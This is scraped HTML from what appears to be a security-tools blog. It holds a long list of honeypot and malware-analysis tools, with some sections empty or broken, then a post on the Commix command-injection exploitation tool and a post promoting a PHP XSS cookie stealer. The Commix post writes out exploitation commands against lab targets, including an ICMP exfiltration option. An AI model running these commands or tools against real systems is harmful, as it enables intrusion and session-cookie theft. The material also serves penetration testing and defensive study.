         <li><a href="http://www.digitalbond.com/tools/scada-honeynet/">scada-honeynet</a> - mimics many of the services from a popular PLC and better helps SCADA researchers understand potential risks of exposed control system devices</li> 
         <li><a href="http://scadahoneynet.sourceforge.net/">SCADA honeynet</a> - Building Honeypots for Industrial Networks</li> 
        </ul> </li> 
       <li>Deployment<br> 
        <ul> 
         <li><a href="http://andrewmichaelsmith.com/2012/03/dionaea-honeypot-on-ec2-in-20-minutes/">Dionaea and EC2 in 20 Minutes</a> - a tutorial on setting up Dionaea on an EC2 instance</li> 
         <li><a href="https://github.com/free5ty1e/honeypotpi">honeypotpi</a> - Script for turning a Raspberry Pi into a Honey Pot Pi</li> 
        </ul> </li> 
       <li>Data Analysis<br> 
        <ul> 
         <li><a href="http://bruteforce.gr/kippo-graph">Kippo-Graph</a> - a full featured script to visualize statistics from a Kippo SSH honeypot</li> 
         <li><a href="https://github.com/mfontani/kippo-stats">Kippo stats</a> - Mojolicious app to display statistics for your kippo SSH honeypot</li> 
        </ul> </li> 
       <li>Other/random<br> 
        <ul> 
         <li><a href="https://github.com/DataSoft/Nova">NOVA</a> uses honeypots as detectors, looks like a complete system.</li> 
         <li><a href="https://pypi.python.org/pypi/opencanary">Open Canary</a> - A low interaction honeypot intended to be run on internal networks.</li> 
         <li><a href="https://github.com/buffer/libemu">libemu</a> - Shellcode emulation library, useful for shellcode detection.</li> 
        </ul> </li> 
       <li>Open Relay Spam Honeypot<br> 
        <ul> 
         <li><a href="https://github.com/miguelraulb/spamhat">SpamHAT</a> - Spam Honeypot Tool</li> 
        </ul> </li> 
       <li>Botnet C2 monitor<br> 
        <ul> 
         <li><a href="https://github.com/pjlantz/Hale">Hale</a> - Botnet command &amp; control monitor</li> 
        </ul> </li> 
       <li>IPv6 attack detection tool<br> 
        <ul> 
         <li><a href="https://github.com/mzweilin/ipv6-attack-detector/">ipv6-attack-detector</a> - Google Summer of Code 2012 project, supported by The Honeynet Project organization</li> 
        </ul> </li> 
       <li>Research Paper<br> 
        <ul> 
         <li><a href="http://link.springer.com/article/10.1007%2Fs10115-008-0137-3">vEYE</a> - behavioral footprinting for self-propagating worm detection and profiling</li> 
        </ul> </li> 
       <li>Honeynet statistics<br> 
        <ul> 
         <li><a href="http://sourceforge.net/projects/honeystats/">HoneyStats</a> - A statistical view of the recorded activity on a Honeynet</li> 
        </ul> </li> 
       <li>Dynamic code instrumentation toolkit<br> 
        <ul> 
         <li><a href="http://www.frida.re/">Frida</a> - Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android</li> 
        </ul> </li> 
       <li>Front-end for dionaea<br> 
        <ul> 
         <li><a href="https://github.com/rubenespadas/DionaeaFR">DionaeaFR</a> - Front Web to Dionaea low-interaction honeypot</li> 
        </ul> </li> 
       <li>Tool to convert website to server honeypots<br> 
        <ul> 
         <li><a href="http://hihat.sourceforge.net/">HIHAT</a> - ransform arbitrary PHP applications into web-based high-interaction Honeypots</li> 
        </ul> </li> 
       <li>Malware collector<br> 
        <ul> 
         <li><a href="http://bruteforce.gr/kippo-malware">Kippo-Malware</a> - Python script that will download all malicious files stored as URLs in a Kippo SSH honeypot database</li> 
        </ul> </li> 
       <li>Sebek in QEMU<br> 
        <ul> 
         <li><a href="https://projects.honeynet.org/sebek/wiki/Qebek">Qebek</a> - QEMU based Sebek. As Sebek, it is data capture tool for high interaction honeypot</li> 
        </ul> </li> 
       <li>Malware Simulator<br> 
        <ul> 
         <li><a href="https://github.com/hbhzwj/imalse">imalse</a> - Integrated MALware Simulator and Emulator</li> 
        </ul> </li> 
       <li>Distributed sensor deployment<br> 
        <ul> 
         <li><a href="https://smarthoneypot.com/">Smarthoneypot</a> - custom honeypot intelligence system that is simple to deploy and easy to manage</li> 
         <li><a href="https://github.com/threatstream/mhn">Modern Honey Network</a> - Multi-snort and honeypot sensor management, uses a network of VMs, small footprint SNORT installations, stealthy dionaeas, and a centralized server for management</li> 
         <li><a href="http://sourceforge.net/projects/adhd/">ADHD</a> - Active Defense Harbinger Distribution (ADHD) is a Linux distro based on Ubuntu LTS. It comes with many tools aimed at active defense preinstalled and configured</li> 
        </ul> </li> 
       <li>Network Analysis Tool<br> 
        <ul> 
         <li><a href="https://code.google.com/p/tracexploit/">Tracexploit</a> - replay network packets</li> 
        </ul> </li> 
       <li>Log anonymizer<br> 
        <ul> 
         <li><a href="http://code.google.com/p/loganon/">LogAnon</a> - log anonymization library that helps having anonymous logs consistent between logs and network captures</li> 
        </ul> </li> 
       <li>server<br> 
        <ul> 
         <li><a href="http://www.honeynet.org/node/773">Honeysink</a> - open source network sinkhole that provides a mechanism for detection and prevention of malicious traffic on a given network</li> 
        </ul> </li> 
       <li>Botnet traffic detection<br> 
        <ul> 
         <li><a href="https://code.google.com/p/dns-mole/">dnsMole</a> - analyse dns traffic, and to potentionaly detect botnet C&amp;C server and infected hosts</li> 
        </ul> </li> 
       <li>Low interaction honeypot (router back door)<br> 
        <ul> 
         <li><a href="https://github.com/knalli/honeypot-for-tcp-32764">Honeypot-32764</a> - Honeypot for router backdoor (TCP 32764)</li> 
        </ul> </li> 
       <li>honeynet farm traffic redirector<br> 
        <ul> 
         <li><a href="https://web.archive.org/web/20120122130150/http://www.honeynet.org.pt/index.php/HoneyMole">Honeymole</a> - eploy multiple sensors that redirect traffic to a centralized collection of honeypots</li> 
        </ul> </li> 
       <li>HTTPS Proxy<br> 
        <ul> 
         <li><a href="http://mitmproxy.org/">mitmproxy</a> - allows traffic flows to be intercepted, inspected, modified and replayed</li> 
        </ul> </li> 
       <li>spamtrap<br> 
        <ul> 
         <li><a href="https://github.com/johestephan/SendMeSpamIDS.py">SendMeSpamIDS.py</a> Simple SMTP fetch all IDS and analyzer</li> 
        </ul> </li> 
       <li>System instrumentation<br> 
        <ul> 
         <li><a href="http://www.sysdig.org/">Sysdig</a> - open source, system-level exploration: capture system state and activity from a running Linux instance, then save, filter and analyze</li> 
        </ul> </li> 
       <li>Honeypot for USB-spreading malware<br> 
        <ul> 
         <li><a href="https://github.com/honeynet/ghost-usb-honeypot">Ghost-usb</a> - honeypot for malware that propagates via USB storage devices</li> 
        </ul> </li> 
       <li>Data Collection<br> 
        <ul> 
         <li><a href="http://bruteforce.gr/kippo2mysql">Kippo2MySQL</a> - extracts some very basic stats from Kippo’s text-based log files (a mess to analyze!) and inserts them in a MySQL database</li> 
         <li><a href="http://bruteforce.gr/kippo2elasticsearch">Kippo2ElasticSearch</a> - Python script to transfer data from a Kippo SSH honeypot MySQL database to an ElasticSearch instance (server or cluster)</li> 
        </ul> </li> 
       <li>Passive network audit framework parser<br> 
        <ul> 
         <li><a href="https://github.com/jusafing/pnaf">pnaf</a> - Passive Network Audit Framework</li> 
        </ul> </li> 
       <li>VM Introspection<br> 
        <ul> 
         <li><a href="http://assert.uaf.edu/research/vmi.html">VIX virtual machine introspection toolkit</a> - VMI toolkit for Xen, called Virtual Introspection for Xen (VIX)</li> 
         <li><a href="http://cs.gmu.edu/~xwangc/Publications/RAID07-VMscope.pdf">vmscope</a> - Monitoring of VM-based High-Interaction Honeypots</li> 
         <li><a href="http://libvmi.com/">vmitools</a> - C library with Python bindings that makes it easy to monitor the low-level details of a running virtual machine</li> 
        </ul> </li> 
       <li>Binary debugger<br> 
        <ul> 
         <li><a href="https://github.com/hexgolems/schem">Hexgolems - Schem Debugger Frontend</a> - A debugger frontend</li> 
         <li><a href="https://github.com/hexgolems/pint">Hexgolems - Pint Debugger Backend</a> - A debugger backend and LUA wrapper for PIN</li> 
        </ul> </li> 
       <li>Mobile Analysis Tool<br> 
        <ul> 
         <li><a href="https://github.com/honeynet/apkinspector/">APKinspector</a> - APKinspector is a powerful GUI tool for analysts to analyze the Android applications</li> 
         <li><a href="https://github.com/androguard/androguard">Androguard</a> - Reverse engineering, Malware and goodware analysis of Android applications ... and more</li> 
        </ul> </li> 
       <li>Low interaction honeypot<br> 
        <ul> 
         <li><a href="http://microsolved.com/HoneyPoint-server.html">Honeypoint</a> - platform of distributed honeypot technologies</li> 
         <li><a href="http://sourceforge.net/projects/honeyperl/">Honeyperl</a> - Honeypot software based in Perl with plugins developed for many functions like : wingates, telnet, squid, smtp, etc</li> 
        </ul> </li> 
       <li>Honeynet data fusion<br> 
        <ul> 
         <li><a href="https://projects.honeynet.org/hflow">HFlow2</a> - data coalesing tool for honeynet/network analysis</li> 
        </ul> </li> 
       <li>Server<br> 
        <ul> 
         <li><a href="http://labrea.sourceforge.net/labrea-info.html">LaBrea</a> - takes over unused IP addresses, and creates virtual servers that are attractive to worms, hackers, and other denizens of the Internet.</li> 
         <li><a href="https://github.com/desaster/kippo">Kippo</a> - SSH honeypot</li> 
         <li><a href="http://www.keyfocus.net/kfsensor/">KFSensor</a> - Windows based honeypot Intrusion Detection System (IDS)</li> 
         <li><a href="https://github.com/provos/honeyd">Honeyd</a> Also see <a href="https://github.com/paralax/awesome-honeypots#honeyd">more honeyd tools</a></li> 
         <li><a href="http://glastopf.org/">Glastopf</a> - Honeypot which emulates thousands of vulnerabilities to gather data from attacks targeting web applications</li> 
         <li><a href="https://github.com/jekil/UDPot">DNS Honeypot</a> - Simple UDP honeypot scripts</li> 
         <li><a href="http://conpot.org/">Conpot</a> - ow interactive server side Industrial Control Systems honeypot</li> 
         <li><a href="http://sourceforge.net/projects/bifrozt/">Bifrozt</a> - High interaction honeypot solution for Linux based systems</li> 
         <li><a href="http://www.beeswarm-ids.org/">Beeswarm</a> - Honeypot deployment made easy</li> 
         <li><a href="http://baitnswitch.sourceforge.net/">Bait and Switch</a> - redirects all hostile traffic to a honeypot that is partially mirroring your production system</li> 
         <li><a href="https://github.com/trustedsec/artillery/">Artillery</a> - open-source blue team tool designed to protect Linux and Windows operating systems through multiple methods</li> 
         <li><a href="http://amunhoney.sourceforge.net/">Amun</a> - vulnerability emulation honeypot</li> 
        </ul> </li> 
       <li>VM cloaking script<br> 
        <ul> 
         <li><a href="https://github.com/nsmfoo/antivmdetection">Antivmdetect</a> - Script to create templates to use with VirtualBox to make vm detection harder</li> 
        </ul> </li> 
       <li>IDS signature generation<br> 
        <ul> 
         <li><a href="http://www.icir.org/christian/honeycomb/">Honeycomb</a></li> 
        </ul> </li> 
       <li>lookup service for AS-numbers and prefixes<br> 
        <ul> 
         <li><a href="http://www.cc2asn.com/">CC2ASN</a></li> 
        </ul> </li> 
       <li>Web interface (for Thug)<br> 
        <ul> 
         <li><a href="https://github.com/pdelsante/rumal">Rumal</a> - Thug's Rum?l: a Thug's dress &amp; weapon</li> 
        </ul> </li> 
       <li>Data Collection / Data Sharing<br> 
        <ul> 
         <li><a href="http://hpfriends.honeycloud.net/#/home">HPfriends</a> - data-sharing platform</li> 
         <li><a href="https://github.com/rep/hpfeeds/">HPFeeds</a> - lightweight authenticated publish-subscribe protocol</li> 
        </ul> </li> 
       <li>Distributed spam tracking<br> 
        <ul> 
         <li><a href="https://www.projecthoneypot.org/">Project Honeypot</a></li> 
        </ul> </li> 
       <li>Python bindings for libemu<br> 
        <ul> 
         <li><a href="https://github.com/buffer/pylibemu">Pylibemu</a> - A Libemu Cython wrapper</li> 
        </ul> </li> 
       <li>Controlled-relay spam honeypot<br> 
        <ul> 
         <li><a href="https://github.com/shiva-spampot/shiva">Shiva</a> - Spam Honeypot with Intelligent Virtual Analyzer 
          <ul> 
           <li><a href="https://www.pentestpartners.com/blog/shiva-the-spam-honeypot-tips-and-tricks-for-getting-it-up-and-running/">Shiva The Spam Honeypot Tips And Tricks For Getting It Up And Running</a></li> 
          </ul> </li> 
        </ul> </li> 
       <li>Visualization Tool<br> 
        <ul> 
         <li><a href="https://github.com/vavkamil/Glastopf-Analytics">Glastopf Analytics</a></li> 
         <li><a href="https://github.com/ayrus/afterglow-cloud">Afterglow Cloud</a></li> 
         <li><a href="http://afterglow.sourceforge.net/">Afterglow</a></li> 
        </ul> </li> 
       <li>central management tool<br> 
        <ul> 
         <li><a href="http://www.nepenthespharm.com/">PHARM</a></li> 
        </ul> </li> 
       <li>Network connection analyzer<br> 
        <ul> 
         <li><a href="http://impost.sourceforge.net/">Impost</a></li> 
        </ul> </li> 
       <li>Virtual Machine Cloaking<br> 
        <ul> 
         <li><a href="https://github.com/jbremer/vmcloak">VMCloak</a></li> 
        </ul> </li> 
       <li>Honeypot deployment<br> 
        <ul> 
         <li><a href="http://threatstream.github.io/mhn/">Modern Honeynet Network</a></li> 
         <li><a href="http://ids.surfnet.nl/">SurfIDS</a></li> 
        </ul> </li> 
       <li>Automated malware analysis system<br> 
        <ul> 
         <li><a href="http://www.cuckoosandbox.org/">Cuckoo</a></li> 
         <li><a href="https://anubis.iseclab.org/">Anubis</a></li> 
         <li><a href="https://www.hybrid-analysis.com/">Hybrid Analysis</a></li> 
        </ul> </li> 
       <li>Low interaction<br> 
        <ul> 
         <li><a href="https://github.com/paralax/awesome-honeypots/blob/master/http/git.mwcollect.org/mwcollectd">mwcollectd</a></li> 
        </ul> </li> 
       <li>Low interaction honeypot on USB stick<br> 
        <ul> 
         <li><a href="http://www.ukhoneynet.org/research/honeystick-howto/">Honeystick</a></li> 
        </ul> </li> 
       <li>Honeypot extensions to Wireshark<br> 
        <ul> 
         <li><a href="https://www.honeynet.org/project/WiresharkExtensions">Whireshark Extensions</a></li> 
        </ul> </li> 
       <li>Data Analysis Tool<br> 
        <ul> 
         <li><a href="https://github.com/yuchincheng/HpfeedsHoneyGraph">HpfeedsHoneyGraph</a></li> 
         <li><a href="https://github.com/hgascon/Acapulco4HNP">Acapulco</a></li> 
        </ul> </li> 
       <li>Telephony honeypot<br> 
        <ul> 
         <li><a href="https://seanmckaybeck.com/zapping-rachel.html">Zapping Rachel</a></li> 
        </ul> </li> 
       <li>Client<br> 
        <ul> 
         <li><a href="https://github.com/shjalayeri/pwnypot">Pwnypot</a></li> 
         <li><a href="http://monkeyspider.sourceforge.net/">MonkeySpider</a></li> 
         <li><a href="https://github.com/CERT-Polska/HSN-Capture-HPC-NG">Capture-HPC-NG</a></li> 
         <li><a href="http://wepawet.cs.ucsb.edu/about.php">Wepawet</a></li> 
         <li><a href="https://urlquery.net/">URLQuery</a></li> 
         <li><a href="https://www.honeynet.org/project/Trigona">Trigona</a></li> 
         <li><a href="https://buffer.github.io/thug/">Thug</a></li> 
         <li><a href="http://www.cs.vu.nl/~herbertb/misc/shelia/">Shelia</a></li> 
         <li><a href="https://github.com/honeynet/phoneyc">PhoneyC</a></li> 
         <li><a href="https://github.com/urule99/jsunpack-n">Jsunpack-n</a></li> 
         <li><a href="https://projects.honeynet.org/honeyc">HoneyC</a></li> 
         <li><a href="http://www.atomicsoftwaresolutions.com/">HoneyBOT</a></li> 
         <li><a href="http://www.gfi.com/products-and-solutions/all-products">CWSandbox / GFI Sandbox</a></li> 
         <li><a href="https://redmine.honeynet.org/projects/linux-capture-hpc/wiki">Capture-HPC-Linux</a></li> 
         <li><a href="https://projects.honeynet.org/capture-hpc">Capture-HPC</a></li> 
         <li><a href="https://anubis.iseclab.org/">Andrubis</a></li> 
        </ul> </li> 
       <li>Visual analysis for network traffic<br> 
        <ul> 
         <li><a href="https://github.com/oguzy/ovizart">ovizart</a></li> 
        </ul> </li> 
       <li>Binary Management and Analysis Framework<br> 
        <ul> 
         <li><a href="http://viper.li/">Viper</a></li> 
        </ul> </li> 
       <li>Honeypot<br> 
        <ul> 
         <li><a href="http://sourceforge.net/projects/single-honeypot/">Single-honeypot</a></li>

         <li><a href="https://github.com/mushorg/imhoneypot">IMHoneypot</a></li>

        </ul> </li> 
       <li>PDF document inspector<br>

        </ul> </li> 
       <li>Distribution system<br> 
        <ul>

        </ul> </li> 
       <li>HoneyClient Management<br> 
        <ul> 
         <li><a href="https://code.google.com/p/gsoc-honeyweb/">HoneyWeb</a></li> 
        </ul> </li> 
       <li>Network Analysis<br>

        </ul> </li> 
       <li>Hybrid low/high interaction honeypot<br>

        </ul> </li> 
       <li>Sebek on Xen<br>

        </ul> </li>

      <h2> <a aria-hidden="true" class="anchor" href="https://github.com/paralax/awesome-honeypots#-honeyd-tools" id="user-content--honeyd-tools"></a></h2>

       <li>Honeyd plugin<br>

      <h2> <a aria-hidden="true" class="anchor" href="https://github.com/paralax/awesome-honeypots#-network-and-artifact-analysis" id="user-content--network-and-artifact-analysis"></a></h2> 
      <h2> <a href="https://draft.blogger.com/null" name="user-content-analysis"></a> Network and Artifact Analysis</h2> 
      <ul> 
       <li>Sandbox<br> 
        <ul> 
         <li><a href="http://monkey.org/~jose/software/rfi-sandbox/">RFISandbox</a> - a PHP 5.x script sandbox built on top of <a href="https://pecl.php.net/package/funcall">funcall</a></li> 
         <li><a href="https://github.com/m4rco-/dorothy2">dorothy2</a> - A malware/botnet analysis framework written in Ruby</li> 
         <li><a href="https://help.comodo.com/topic-72-1-451-4768-.html">COMODO automated sandbox</a></li> 
         <li><a href="http://www.few.vu.nl/argos/">Argos</a> - An emulator for capturing zero-day attacks</li> 
        </ul> </li> 
       <li>Sandbox-as-a-Service<br> 
        <ul> 
         <li><a href="https://malwr.com/">malwr.com</a> - free malware analysis service and community</li> 
         <li><a href="http://detux.org/">detux.org</a> - Multiplatform Linux Sandbox</li> 
         <li><a href="https://jbxcloud.joesecurity.org/login">Joebox Cloud</a> - analyzes the behavior of malicious files including PEs, PDFs, DOCs, PPTs, XLSs, APKs, URLs and MachOs on Windows, Android and Mac OS X for suspicious activities</li> 
        </ul> </li> 
      </ul> 
      <h2> <a aria-hidden="true" class="anchor" href="https://github.com/paralax/awesome-honeypots#-data-tools" id="user-content--data-tools"></a></h2> 
      <h2> <a href="https://draft.blogger.com/null" name="user-content-visualizers"></a> Data Tools</h2> 
      <ul> 
       <li>Front Ends<br> 
        <ul> 
         <li><a href="https://github.com/aplura/Tango">Tango</a> - Honeypot Intelligence with Splunk</li> 
         <li><a href="https://github.com/jedie/django-kippo">Django-kippo</a> - Django App for kippo SSH Honeypot</li> 
         <li><a href="https://github.com/GovCERT-CZ/Wordpot-Frontend">Wordpot-Frontend</a> - a full featured script to visualize statistics from a Wordpot honeypot -<a href="https://github.com/GovCERT-CZ/Shockpot-Frontend">Shockpot-Frontend</a> - a full featured script to visualize statistics from a Shockpot honeypot</li> 
        </ul> </li> 
       <li>Visualization<br> </li> 
       <ul> 
        <li><a href="https://github.com/fw42/honeymap">HoneyMap</a> - Real-time websocket stream of GPS events on a fancy SVG world map</li> 
        <li><a href="https://github.com/SneakersInc/HoneyMalt">HoneyMalt</a> - Maltego tranforms for mapping Honeypot systems</li> 
       </ul> 
      </ul>

    </article> 
    <article class="post hentry" id="8615667636589100835" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Commix - Automated All-in-One OS Command Injection and Exploitation Tool  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8615667636589100835" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-ma_TUtwwGTE/VSBsS4NlEdI/AAAAAAAAD3I/lnRwOE_5mAI/s1600/commix.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-ma_TUtwwGTE/VSBsS4NlEdI/AAAAAAAAD3I/lnRwOE_5mAI/s1600/commix.png"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Commix (short for [comm]and [i]njection e[x]ploiter) has a simple environment and it can be used, from web developers, penetration testers or even security researchers to test web applications with the view to find bugs, errors or vulnerabilities related to command injection attacks. By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or string. Commix is written in Python programming language.
      </div> 
      <a name="more"></a>
      <br> 
      <strong><span style="font-size: large;"> Requirements</span></strong>
      <br> 
      <a href="http://www.python.org/download/">Python</a> version 
      <strong>2.6.x</strong> or 
      <strong>2.7.x</strong> is required for running this program.
      <br> 
      <br> 
      <strong><span style="font-size: large;"> Installation</span></strong>
      <br> Download commix by cloning the Git repository:
      <br> 
      <pre><code>git clone https://github.com/stasinopoulos/commix.git commix
</code></pre> 
      <br> 
      <strong><span style="font-size: large;"> Usage</span></strong>
      <br> Usage: python commix.py [options]
      <br> 
      <br> 
      <strong><span style="font-size: large;"> Options</span></strong>
      <br> -h, --help Show help and exit.
      <br> 
      <pre><code>--verbose             Enable the verbose mode.
--install             Install 'commix' to your system.
--version             Show version number and exit.
--update              Check for updates (apply if any) and exit.
</code></pre> 
      <br> 
      <strong> Target</strong>
      <br> This options has to be provided, to define the target URL.
      <br> 
      <pre><code>
--url=URL           Target URL.
--url-reload        Reload target URL after command execution.
</code></pre> 
      <br> 
      <strong> Request</strong>
      <br> These options can be used, to specify how to connect to the target
      <br> 
      <pre><code>URL.

--host=HOST         HTTP Host header.
--referer=REFERER   HTTP Referer header.
--user-agent=AGENT  HTTP User-Agent header.
--cookie=COOKIE     HTTP Cookie header.
--headers=HEADERS   Extra headers (e.g. 'Header1:Value1\nHeader2:Value2').
--proxy=PROXY       Use a HTTP proxy (e.g. '127.0.0.1:8080').
--auth-url=AUTH_..  Login panel URL.
--auth-data=AUTH..  Login parameters and data.
--auth-cred=AUTH..  HTTP Basic Authentication credentials (e.g.
                    'admin:admin').
</code></pre> 
      <br> 
      <strong> Injection</strong>
      <br> These options can be used, to specify which parameters to inject and
      <br> 
      <pre><code>to provide custom injection payloads.

--data=DATA         POST data to inject (use 'INJECT_HERE' tag).
--suffix=SUFFIX     Injection payload suffix string.
--prefix=PREFIX     Injection payload prefix string.
--technique=TECH    Specify a certain injection technique : 'classic',
                    'eval-based', 'time-based' or 'file-based'.
--maxlen=MAXLEN     The length of the output on time-based technique
                    (Default: 10000 chars).
--delay=DELAY       Set Time-delay for time-based and file-based
                    techniques (Default: 1 sec).
--base64            Use Base64 (enc)/(de)code trick to prevent false-
                    positive results.
--tmp-path=TMP_P..  Set remote absolute path of temporary files directory.
--icmp-exfil=IP_..  Use the ICMP exfiltration technique (e.g.
                    'ip_src=192.168.178.1,ip_dst=192.168.178.3').
</code></pre> 
      <br> 
      <strong><span style="font-size: large;"> Usage Examples</span></strong>
      <br> 
      <br> 
      <strong>Exploiting <a href="http://www.dvwa.co.uk/">Damn Vulnerable Web App</a></strong>
      <br> 
      <pre><code>python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=INJECT_HERE&amp;submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
</code></pre> 
      <strong>Exploiting <a href="http://www.exploit-db.com/exploits/25496/">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:</strong>
      <br> 
      <pre><code>python commix.py --url="http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE" --prefix="//" --suffix="'" 
</code></pre> 
      <strong>Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae">OWASP Mutillidae</a> using Extra headers and HTTP proxy:</strong>
      <br> 
      <pre><code>python commix.py --url="http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php" --data="target_host=INJECT_HERE" --headers="Accept-Language:fr\nETag:123\n" --proxy="127.0.0.1:8081"
</code></pre> 
      <strong>Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/">Persistence</a> using ICMP exfiltration technique :</strong>
      <br> 
      <pre><code>su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/stasinopoulos/commix" target="_blank">Download&nbsp;Commix</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="9162910490760916616" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Cookies Manager - Simple Cookie Stealer  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-9162910490760916616" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-rjhvO9I5IHU/VQECsXNtn7I/AAAAAAAADxo/DJBKBrx48TM/s1600/cookies_manager.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-rjhvO9I5IHU/VQECsXNtn7I/AAAAAAAADxo/DJBKBrx48TM/s1600/cookies_manager.jpg" height="576" width="640"></a>
      </div> 
      <br> A simple program in PHP to help with XSS vulnerability in this program are the following:
      <br> 
      <br> [+] Cookie Stealer with TinyURL Generator
      <br> [+] Can you see the cookies that brings back a page
      <br> [+] Can create cookies with information they want
      <br> [+] Hidden to login to enter Panel use ?poraca to find the login
      <br> 
      <br> A video with examples of use :
      <br> 
      <a name="more"></a> 
      <center> 
       <iframe allowfullscreen frameborder="0" height="360" src="https://www.youtube.com/embed/UOIjf5ms1Ps" width="480"></iframe>
      </center>

      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/DoddyHackman/Cookies_Manager" target="_blank">Download&nbsp;Cookies Manager</a></span></b>
      </div>
